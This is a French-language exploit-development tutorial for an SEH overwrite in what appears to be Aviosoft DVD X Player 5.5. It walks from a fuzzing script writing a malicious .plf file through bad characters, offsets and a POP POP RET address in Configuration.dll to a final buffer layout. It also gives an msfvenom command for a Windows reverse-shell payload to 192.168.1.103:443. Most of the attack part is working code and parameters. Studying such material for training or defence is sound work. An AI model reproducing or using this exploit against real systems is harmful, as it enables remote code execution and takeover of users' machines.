# Windows dev exploit SEH

1. Fuzzing
2. Identifier l'exception
3. Identifier les badchars
4. Créer un pattern
5. Localiser le SEH
6. Trouver un POP POP RETN
7. Remplacer le nSEH
8. Générer l'exploit


## Etape 2 : Identifier l'exception

```PYTHON

filename="evil.plf"
buffer ="A"*2000
textfile=open(filename, 'w')
textfile.write(buffer)
textfile.close()

```

L'EIP est bien écrasé mais ECX ne contient pas encore les 41 ("A")

![](images/first_crash.png)

On jump après la première exeception dans immunity debugger avec Shift + F9

![](images/second_crash.png)

L'EIP est bien écrasé et ECX contient les 41 ("A")

## Etape 3 : Identifier les badchars 

Les badchars sont \x00\x0a\x0d\x1a


## Etape 4 : Créer un pattern 

On créer un pattern

```BASH
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
```


## Etape 5 : Localiser le SEH

On trouve la position du SEH dans immunity debugger avec mona : 

```
!mona findmsp
```
![](images/findmsp.png)

On a junk + nSEH + SEH + junk : "A" * 608 + nSEH + SEH + "D" * (2000 - 608 - 4 - 4)

## Etape 6 : Trouver un POP POP RETN

On cherche ensuite un SEH avec POP POP RETN : !mona seh 

Aller voir dans le fichier [seh.txt](files/seh.txt) dans le dossier de Immunity Debugger.

On cherche une ligne avec que des False et une adresse qui ne contiennent pas de badchars

```
0x6032d03b : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [Configuration.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.2.5.2007 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\Configuration.dll)
```
On réexcute le programme en modifiant l'adresse du SEH


## Etape 7 : Remplacer le nSEH


Normalement dans immunity debugger l'instruction est précédé de 4 x 42

![](images/jmp_nseh.png)

Clique droit dessus => Assemble , on entre alors une adresse où les 44 (D) sont présents
 : jmp 0012F581

![](images/replace_jmp_nseh.png)

On voit que les deux premières instructions sont remplacés par EB 0F
Mais pas les deux suivantes (42 42) donc notre SEH vaudra : eb 0f 90 90


On a alors : junk + nSEH + SEH + junk : 
```
"A" * 608 + "\x90\x90\x0f\xeb" + "\x3b\xd0\x32\x60" + "D" * (2000 - 608 - 4 - 4)
```

## Etape 8 : Générer l'exploit

On ajoute des NOP après le SEH pour être sur que l'exploit s'execute bien, ce qui nous donne 

```
"A" * 608 + "\x90\x90\x0f\xeb" + "\x3b\xd0\x32\x60" + 16*"\x90" + "D" * (2000 - 608 - 4 - 4 - 16)
```

Enfin on ajoute notre Shellcode :
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.103 LPORT=443 -b"\x00\x0a\x0d\x1a" -f python EXITFUNC=thread -a x86
```

Notre exploit final :

```
"A" * 608 + "\x90\x90\x0f\xeb" + "\x3b\xd0\x32\x60" + 16*"\x90" + shellcode + "D" * (2000 - 608 - 4 - 4 - 16 - len(shellcode))
```

 Source : https://www.fuzzysecurity.com/tutorials/expDev/3.html